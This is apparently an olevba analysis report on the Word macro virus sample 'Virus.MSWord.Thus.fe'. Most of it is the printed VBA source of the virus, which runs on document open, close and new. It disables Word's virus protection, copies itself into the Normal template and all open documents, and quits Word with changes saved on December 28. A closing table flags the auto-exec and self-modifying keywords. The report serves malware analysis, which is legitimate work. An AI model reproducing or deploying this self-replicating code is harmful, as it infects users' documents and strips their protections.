olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Thus.fe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Thus.fe - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'delta'
Private Sub document_OPEN()
    On Error Resume Next
    If Application.Options.VirusProtection Then Application.Options.VirusProtection = Not Application.Options.VirusProtection
    healthsearch = "'delta'"
    First = False
    healthstr = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1)
    If healthstr <> healthsearch Then
     First = True
     NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .deleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
    .CodeModule.CountOfLines
  
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
.InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
.CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
.Item(1).CodeModule.CountOfLines)
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.deleteLines 44, 4
a1 = "Application.Documents.Item(K).VBProject.VBComponents.Item(1) _"
b1 = ".CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _"
c1 = ".Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _"
d1 = ".VBComponents.Item(1).CodeModule.CountOfLines)"
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 44, a1
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 45, b1
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 46, c1
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 47, d1
a1 = " ' '"
b1 = " ' '"
c1 = " ' '"
d1 = " ' '"
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.deleteLines 14, 4
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 14, a1
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 15, b1
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 16, c1
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 17, d1
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    If Not First Then
    For K = 1 To Application.Documents.Count
    If Application.Documents.Item(K).VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> healthsearch Then
    Application.Documents.Item(K).VBProject.VBComponents.Item(1) _
    .CodeModule.deleteLines 1, Application.Documents.Item(K) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
 ' '
 ' '
 ' '
 ' '

Application.Documents.Item(K).VBProject.VBComponents.Item(1).CodeModule.deleteLines 14, 4
a1 = "NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _"
b1 = ".InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _"
c1 = ".CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _"
d1 = ".Item(1).CodeModule.CountOfLines)"
Application.Documents.Item(K).VBProject.VBComponents.Item(1).CodeModule.InsertLines 14, a1
Application.Documents.Item(K).VBProject.VBComponents.Item(1).CodeModule.InsertLines 15, b1
Application.Documents.Item(K).VBProject.VBComponents.Item(1).CodeModule.InsertLines 16, c1
Application.Documents.Item(K).VBProject.VBComponents.Item(1).CodeModule.InsertLines 17, d1
a1 = " ' '"
b1 = " ' '"
c1 = " ' '"
d1 = " ' '"
Application.Documents.Item(K).VBProject.VBComponents.Item(1).CodeModule.deleteLines 44, 4
Application.Documents.Item(K).VBProject.VBComponents.Item(1).CodeModule.InsertLines 44, a1
Application.Documents.Item(K).VBProject.VBComponents.Item(1).CodeModule.InsertLines 45, b1
Application.Documents.Item(K).VBProject.VBComponents.Item(1).CodeModule.InsertLines 46, c1
Application.Documents.Item(K).VBProject.VBComponents.Item(1).CodeModule.InsertLines 47, d1
    End If
     Next K
    End If
    If (Month(Date) = 12) And (Day(Date) = 28) Then Application.Quit SaveChanges:=wdSaveChanges
   End Sub
Private Sub document_close()
document_OPEN
End Sub
Private Sub document_new()
document_OPEN
End Sub











+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_new        |Runs when a new Word document is created     |
|AutoExec  |document_OPEN       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

